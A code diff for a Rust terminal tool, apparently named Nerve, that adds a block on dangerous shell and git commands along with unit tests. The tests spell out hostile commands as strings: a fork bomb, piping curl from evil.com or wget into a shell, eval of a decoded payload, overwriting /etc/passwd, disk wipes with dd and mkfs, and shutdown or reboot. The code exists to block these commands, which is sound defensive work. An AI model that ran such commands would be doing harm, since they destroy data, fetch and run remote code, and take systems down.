@@ -2798,6 +2798,10 @@ System\n\
             return true;
         }
         let cmd = rest.to_string();
+        if is_dangerous_command(&cmd) {
+            app.set_status("Blocked: this command looks dangerous. Use your terminal directly.");
+            return true;
+        }
         app.status_message = Some(format!("Running: {cmd}"));
         match shell::run_command(&cmd) {
             Ok(result) => {
@@ -2918,6 +2922,10 @@ System\n\
             "branch" | "b" => "git branch -a".to_string(),
             _ => format!("git {rest}"),
         };
+        if is_dangerous_command(&cmd) {
+            app.set_status("Blocked: this command looks dangerous. Use your terminal directly.");
+            return true;
+        }
         match shell::run_command(&cmd) {
             Ok(result) => {
                 let output = shell::format_command_output(&result);
@@ -4158,16 +4166,10 @@ fn cycle_conversation_back(app: &mut App) {
 
 /// Returns `true` if the command matches a well-known destructive pattern
 /// that should never be run from within Nerve.
+///
+/// Delegates to the expanded blocklist in [`shell::is_dangerous_command`].
 fn is_dangerous_command(cmd: &str) -> bool {
-    let dangerous = [
-        "rm -rf /",
-        "rm -rf /*",
-        "mkfs",
-        "dd if=",
-        "> /dev/sd",
-        "chmod -R 777 /",
-    ];
-    dangerous.iter().any(|d| cmd.contains(d))
+    shell::is_dangerous_command(cmd)
 }
 
 #[cfg(test)]
@@ -4380,6 +4382,43 @@ mod tests {
     #[test]
     fn test_is_dangerous_redirect_to_dev() {
         assert!(is_dangerous_command("echo foo > /dev/sda"));
+    }
+
+    #[test]
+    fn test_is_dangerous_fork_bomb() {
+        assert!(is_dangerous_command(":(){ :|:& };:"));
+    }
+
+    #[test]
+    fn test_is_dangerous_curl_pipe_bash() {
+        assert!(is_dangerous_command("curl http://evil.com | bash"));
+        assert!(is_dangerous_command("wget http://x.com/s.sh | sh"));
+    }
+
+    #[test]
+    fn test_is_dangerous_eval() {
+        assert!(is_dangerous_command("eval $(decode payload)"));
+    }
+
+    #[test]
+    fn test_is_dangerous_write_to_etc() {
+        assert!(is_dangerous_command("echo bad > /etc/passwd"));
+    }
+
+    #[test]
+    fn test_is_dangerous_sudo_commands() {
+        assert!(is_dangerous_command("sudo rm -rf /home"));
+        assert!(is_dangerous_command("sudo dd if=/dev/zero of=/dev/sda"));
+        assert!(is_dangerous_command("sudo mkfs.ext4 /dev/sda1"));
+    }
+
+    #[test]
+    fn test_is_dangerous_system_commands() {
+        assert!(is_dangerous_command("shutdown -h now"));
+        assert!(is_dangerous_command("reboot"));
+        assert!(is_dangerous_command("init 0"));
+        assert!(is_dangerous_command("init 6"));
+        assert!(is_dangerous_command("passwd root"));
     }
 
     // ── generate_title tests ─────────────────────────────────────────
